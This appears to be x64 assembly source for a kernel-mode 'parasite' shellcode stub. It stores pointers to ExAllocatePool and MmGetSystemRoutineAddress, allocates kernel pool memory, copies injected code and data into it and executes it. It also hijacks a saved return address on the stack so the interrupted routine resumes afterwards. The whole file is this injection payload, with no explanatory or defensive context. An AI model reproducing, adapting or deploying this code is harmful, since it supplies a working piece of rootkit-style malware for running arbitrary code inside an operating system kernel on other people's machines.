.data

.code



parasite PROC
ssbase:
call overdata
dq 0 ; kernelbase ; 0
dq 0 ; ExAllocatePool ; 1
dq 0 ; MmGetSystemRoutineAddress ; 2
dq 0 ; um_code ; 3
dq 0 ; km_code ; 4
dq 0 ; um_code_size; 5
dq 0 ; um_data; 6
dq 0 ; km_data ; 7
dq 0 ; um_data_size; 8
overdata:
pop rax
call overint
nop
call ov1
dq 0
ov1:
pop rax

push rax

push rcx
;int 3

call delta
delta:	
pop	rcx

mov rax, offset delta
sub	rcx, rax
mov rax, offset ssbase+5
add rcx, rax

mov rax, [rcx]
add [rcx+8], rax
add [rcx+16], rax

push r8
push r9
push rbx

push rdx
push r13
push r12
push r11
push r10
pushfq

; allocate and copy code
push rcx
sub rsp,030h

mov r12, [rcx+8]
mov rdx, [rcx+8*5] ;
sub rcx, rcx
call r12

add rsp,030h
pop rcx
;
push rcx
mov [rcx+8*4], rax
mov rsi, [rcx+8*3]
mov rdi, rax
mov rcx, [rcx+8*5] ;
rep movsb
pop rcx

; allocate and copy data
push rcx
sub rsp,030h

mov r12, [rcx+8]
mov rdx, [rcx+8*8] ;
sub rcx, rcx
call r12

add rsp,030h
pop rcx


push rcx
mov [rcx+8*7], rax
mov rsi, [rcx+8*6]
mov rdi, rax
mov rcx, [rcx+8*8] ;
rep movsb
pop rcx

mov rax, [rcx+8*4]
mov rcx, [rcx+8*7]
mov rdx, rcx

sub rsp,030h
call rax
add rsp,030h

popfq
pop r10
pop r11
pop r12
pop r13
pop rdx
pop rbx
pop r9
pop r8

pop rcx ; restore original

pop rax

jmp qword ptr[rax]

overint:
pop rax
cmp qword ptr [rax+5+1],0
jnz once_c

push qword ptr [rsp+130h]
pop qword ptr [rax+5+1]
mov [rsp+130h], rax

once_c:
ret

parasite ENDP


parasite_end PROC
ret
parasite_end ENDP


END
